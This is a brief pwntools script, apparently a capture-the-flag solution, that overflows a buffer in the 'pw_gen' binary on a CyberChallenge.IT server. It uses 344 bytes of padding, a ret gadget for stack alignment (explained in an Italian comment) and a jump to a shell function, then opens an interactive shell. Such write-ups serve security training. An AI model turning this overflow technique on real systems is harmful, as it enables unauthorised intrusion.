from pwn import *

p = remote("securepw.challs.cyberchallenge.it", 9216)

exe = ELF("./pw_gen")
context.binary = exe

shell_addr = 0x004007a7

ret_addr = 0x400626

offset = 344

payload = b"A" * offset + p64(ret_addr) + p64(shell_addr)

p.sendline(payload)
p.interactive()
# L’architettura x86_64 richiede che lo stack (RSP) sia allineato a 16 byte quando chiami una funzione da libc (es. system)